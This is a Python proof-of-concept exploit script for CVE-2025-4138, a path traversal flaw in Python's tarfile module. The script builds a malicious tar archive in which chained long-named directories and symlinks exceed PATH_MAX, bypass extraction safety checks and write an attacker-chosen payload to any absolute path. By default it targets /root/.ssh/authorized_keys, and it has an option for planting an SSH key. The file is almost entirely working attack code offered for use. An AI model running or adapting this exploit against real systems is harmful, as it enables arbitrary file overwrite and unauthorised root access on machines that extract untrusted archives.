#!/usr/bin/env python3
"""
CVE-2025-4138 - Python tarfile PATH_MAX Bypass Exploitation PoC

Demonstrates a path traversal vulnerability in Python's tarfile module where
symlink chains can be used to exceed PATH_MAX, bypassing safety checks and
allowing arbitrary file writes outside the extraction directory.

Author: d3vn0mi
Repository: https://github.com/d3vn0mi/cve_2025_4138_poc
"""

import argparse
import io
import os
import stat
import struct
import sys
import tarfile

BANNER = r"""
   _______  _______     ____  ___ ___  ___      _ _  _ _____ ___
  / ___\ \ / / ____|   |___ \/ _ \__ \| __|    | | || |___ /( _ )
 | |    \ V /|  _| _____ __) | | | |) |__ \ ___| | || |_|_ \/ _ \
 | |___  | | | |__|_____/ __/| |_| / __/___) |___|__   _|__) \__, |
  \____| |_| |_____|   |_____|\___/_____|____/      |_||____/ /_/

  [ CVE-2025-4138 :: Python tarfile PATH_MAX Bypass ]
  [ Author: d3vn0mi                                 ]
"""

# Exploitation parameters
DIR_COMPONENT_LENGTH = 247       # Length of each directory name in the chain
SYMLINK_CHAIN_STEPS = "abcdefghijklmnop"  # 16 levels of symlink indirection
LONG_LINK_NAME_LENGTH = 254      # Length of the pivot symlink name component
DEFAULT_TRAVERSAL_DEPTH = 8      # Default ../ depth for escape


def log_info(msg):
    print(f"[*] {msg}")


def log_success(msg):
    print(f"[+] {msg}")


def log_error(msg):
    print(f"[-] {msg}", file=sys.stderr)


def log_warn(msg):
    print(f"[!] {msg}")


def validate_target_path(target_file):
    """Validate that the target file path is absolute."""
    if not os.path.isabs(target_file):
        log_error(f"Target path must be absolute: {target_file}")
        sys.exit(1)


def read_payload_from_file(filepath):
    """Read payload content from a file."""
    expanded = os.path.expanduser(filepath)
    if not os.path.isfile(expanded):
        log_error(f"Payload file not found: {expanded}")
        sys.exit(1)
    with open(expanded, "rb") as f:
        return f.read()


def build_exploit(tar_path, target_file, payload, file_mode=0o600, traversal_depth=DEFAULT_TRAVERSAL_DEPTH):
    """
    Build a malicious tarball that exploits CVE-2025-4138.

    The exploit works in 4 stages:
      1. Path Inflation  - Create a deep directory + symlink chain so the
                           resolved path exceeds PATH_MAX (4096 on Linux).
      2. Pivot Symlink   - Add a symlink whose resolved target crosses the
                           PATH_MAX boundary, causing tarfile to skip its
                           safety check.
      3. Escape Symlink  - Chain back out of the deep path using ../ to
                           reach an arbitrary location on the filesystem.
      4. Payload Drop    - Write the payload file through the escape symlink.

    Args:
        tar_path:         Output path for the malicious tar archive.
        target_file:      Absolute path of the file to overwrite on the target.
        payload:          Bytes content to write.
        file_mode:        Unix permission bits for the payload file.
        traversal_depth:  Number of ../ components to escape the chain.
    """
    validate_target_path(target_file)

    dir_component = "d" * DIR_COMPONENT_LENGTH
    inner_path = ""

    log_info(f"Building exploit tarball: {tar_path}")
    log_info(f"Target file: {target_file}")
    log_info(f"Payload size: {len(payload)} bytes")
    log_info(f"Traversal depth: {traversal_depth}")

    with tarfile.open(tar_path, "w") as tar:
        # --- Stage 1: Path inflation chain ---
        log_info("Stage 1/4: Creating symlink chain for path inflation...")
        for i, step_char in enumerate(SYMLINK_CHAIN_STEPS):
            # Create a directory with a long name
            d = tarfile.TarInfo(name=os.path.join(inner_path, dir_component))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)

            # Create a short symlink pointing to that long directory
            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
            s.type = tarfile.SYMTYPE
            s.linkname = dir_component
            tar.addfile(s)

            inner_path = os.path.join(inner_path, dir_component)
            log_info(f"  Chain link {i + 1}/{len(SYMLINK_CHAIN_STEPS)}: "
                     f"resolved path length ~{(i + 1) * DIR_COMPONENT_LENGTH} bytes")

        # --- Stage 2: Pivot symlink (exceeds PATH_MAX) ---
        log_info("Stage 2/4: Creating pivot symlink (PATH_MAX bypass)...")
        short_chain = "/".join(SYMLINK_CHAIN_STEPS)
        link_name = os.path.join(short_chain, "l" * LONG_LINK_NAME_LENGTH)

        pivot = tarfile.TarInfo(name=link_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(SYMLINK_CHAIN_STEPS)
        tar.addfile(pivot)

        log_info(f"  Short chain path: {short_chain}")
        log_info(f"  Pivot resolves back {len(SYMLINK_CHAIN_STEPS)} levels")

        # --- Stage 3: Escape symlink ---
        log_info("Stage 3/4: Creating escape symlink (directory traversal)...")
        target_dir = os.path.dirname(target_file)
        target_basename = os.path.basename(target_file)

        escape_linkname = link_name + "/" + ("../" * traversal_depth) + target_dir.lstrip("/")

        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_linkname
        tar.addfile(esc)

        log_info(f"  Escape target directory: {target_dir}")

        # --- Stage 4: Payload delivery ---
        log_info("Stage 4/4: Writing payload through escape symlink...")
        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
        payload_entry.type = tarfile.REGTYPE
        payload_entry.size = len(payload)
        payload_entry.mode = file_mode
        payload_entry.uid = 0
        payload_entry.gid = 0
        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))

    file_size = os.path.getsize(tar_path)
    log_success(f"Exploit tarball created: {tar_path}")
    log_success(f"Archive size: {file_size} bytes")
    log_success(f"Target: {target_file} (mode {oct(file_mode)})")


def verify_tarball(tar_path):
    """Print a summary of the generated tarball for inspection."""
    log_info(f"Verifying tarball: {tar_path}")
    with tarfile.open(tar_path, "r") as tar:
        members = tar.getmembers()
        dirs = sum(1 for m in members if m.isdir())
        syms = sum(1 for m in members if m.issym())
        regs = sum(1 for m in members if m.isreg())
        log_info(f"  Total entries: {len(members)}")
        log_info(f"  Directories: {dirs} | Symlinks: {syms} | Files: {regs}")
        for m in members:
            kind = "DIR" if m.isdir() else "SYM" if m.issym() else "REG" if m.isreg() else "???"
            extra = f" -> {m.linkname}" if m.issym() else f" ({m.size}B)" if m.isreg() else ""
            name_display = m.name if len(m.name) <= 60 else m.name[:57] + "..."
            log_info(f"  [{kind}] {name_display}{extra}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="CVE-2025-4138 - Python tarfile PATH_MAX bypass PoC",
        epilog="Author: d3vn0mi | For authorized security testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-o", "--output",
        default="exploit.tar",
        help="Output tarball path (default: exploit.tar)",
    )
    parser.add_argument(
        "-t", "--target",
        default="/root/.ssh/authorized_keys",
        help="Absolute path of file to write on target (default: /root/.ssh/authorized_keys)",
    )
    parser.add_argument(
        "-p", "--payload",
        help="Path to payload file (reads content from this file)",
    )
    parser.add_argument(
        "-s", "--payload-string",
        help="Use a literal string as the payload",
    )
    parser.add_argument(
        "-k", "--ssh-key",
        help="Path to SSH public key file (shorthand for common use case)",
    )
    parser.add_argument(
        "-m", "--mode",
        default="0600",
        help="File permission mode in octal (default: 0600)",
    )
    parser.add_argument(
        "-d", "--depth",
        type=int,
        default=DEFAULT_TRAVERSAL_DEPTH,
        help=f"Directory traversal depth (default: {DEFAULT_TRAVERSAL_DEPTH})",
    )
    parser.add_argument(
        "-v", "--verify",
        action="store_true",
        help="Verify and dump tarball contents after creation",
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress banner output",
    )

    return parser.parse_args()


def main():
    args = parse_args()

    if not args.quiet:
        print(BANNER)

    # Determine payload source
    payload_sources = [args.payload, args.payload_string, args.ssh_key]
    provided = sum(1 for s in payload_sources if s is not None)

    if provided == 0:
        log_error("No payload specified. Use -p FILE, -s STRING, or -k SSH_KEY.")
        sys.exit(1)
    if provided > 1:
        log_error("Specify only one payload source: -p, -s, or -k.")
        sys.exit(1)

    if args.payload:
        payload = read_payload_from_file(args.payload)
    elif args.ssh_key:
        payload = read_payload_from_file(args.ssh_key)
        # Ensure SSH key ends with newline
        if not payload.endswith(b"\n"):
            payload += b"\n"
    else:
        payload = args.payload_string.encode()

    if len(payload) == 0:
        log_error("Payload is empty.")
        sys.exit(1)

    # Parse file mode
    try:
        file_mode = int(args.mode, 8)
    except ValueError:
        log_error(f"Invalid octal mode: {args.mode}")
        sys.exit(1)

    # Build the exploit
    build_exploit(
        tar_path=args.output,
        target_file=args.target,
        payload=payload,
        file_mode=file_mode,
        traversal_depth=args.depth,
    )

    # Optionally verify
    if args.verify:
        print()
        verify_tarball(args.output)

    print()
    log_success("Done. Use with caution - authorized testing only.")


if __name__ == "__main__":
    main()
